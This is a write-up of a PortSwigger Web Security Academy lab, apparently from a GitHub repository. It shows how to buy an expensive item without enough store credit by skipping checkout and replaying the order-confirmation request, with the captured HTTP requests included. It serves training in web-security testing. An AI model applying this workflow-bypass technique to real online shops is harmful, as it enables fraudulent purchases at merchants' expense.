## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/2a762499-882e-440d-915a-5b76a64c029c)

## Overview:

> Users won't always follow the intended sequence 

Many transactions rely on **predefined workflows consisting of a sequence of steps**. The web interface will typically guide users through this process, taking them to the next step of the workflow each time they complete the current one. However, **attackers won't necessarily adhere to this intended sequence.**

Using tools like Burp Proxy and Repeater, **once an attacker has seen a request, they can replay it at will and use forced browsing to perform any interactions with the server in any order they want**. This allows them to complete different actions while the application is in an unexpected state. 

To identify these kinds of flaws, you should use forced browsing to submit requests in an unintended sequence. For example, _you might skip certain steps, access a single step more than once_, return to earlier steps, and so on

## Solution :

So we need to abuse the flawed workflow while ordering a product to solve this lab.

### Workflow

First login as wiener .Click on the leather jacket product & add the item to cart.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/97324883-e8e7-49a9-b5bd-71454da7a77a)

The following request is sent.

```http
POST /cart HTTP/1.1
Host: 0ae800f303e463fc846da16000350070.web-security-academy.net
Cookie: session=G44CZuircwtnZmoAaSNwDSwpbsULi7uP
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: https://0ae800f303e463fc846da16000350070.web-security-academy.net
Referer: https://0ae800f303e463fc846da16000350070.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

productId=1&redir=PRODUCT&quantity=1
```

In the cart page, we can see that the product is added & we can now place the order.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/dd59c3aa-f1c2-4d7f-8dd5-ad3690723c21)

When we place the order the following POST request is sent to `/cart/checkout`.

```http
POST /cart/checkout HTTP/2
Host: 0ae800f303e463fc846da16000350070.web-security-academy.net
Cookie: session=FrFZmMsVa1rg3dwRExGgltBTD0gijy4m
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: https://0ae800f303e463fc846da16000350070.web-security-academy.net
Referer: https://0ae800f303e463fc846da16000350070.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

csrf=viHBF1tw4OTvvpMH8ukIZ9TjfivZqHrR
```
#### Case 1 - [ product_value > store_credit ]

But then we can't buy the jacket($1337) since we have only $100.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/5f005e6f-9da4-4bed-a7c8-c78f800cb96b)

#### Case 2 - [ product_value < store_credit ]

We repeat the same process again but this time we add a product that costs less than $100.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/a1025da9-fe20-45b6-ab57-36b382360a19)

This time when we place the order, we have another request being sent after */cart/checkout* which is a GET request to */cart/order-confirmation*

```http
GET /cart/order-confirmation?order-confirmed=true HTTP/2
Host: 0ae800f303e463fc846da16000350070.web-security-academy.net
Cookie: session=FrFZmMsVa1rg3dwRExGgltBTD0gijy4m
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0ae800f303e463fc846da16000350070.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

### Abusing flawed workflow logic -

Thinking from an attacker's perspective, we can add any costly product, in our case the **leather jacket** & just resend the GET request to */cart/order-confirmation* endpoint with parameter `?order-confirmation=true` to place an order wihtout going through the intended workflow.

By this way we're abusing the flawed workflow mechanism since the server doesn't validate the workflow properly.

Now to solve the lab perform the following steps.

- Add the leather jacket to cart (can also add n number of jackets as our wish).
- Send GET request to /cart/order-confirmation.

Refresh the page to confirm that the lab is solved.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/3842b00f-efd5-40ab-9286-57320c73a824)
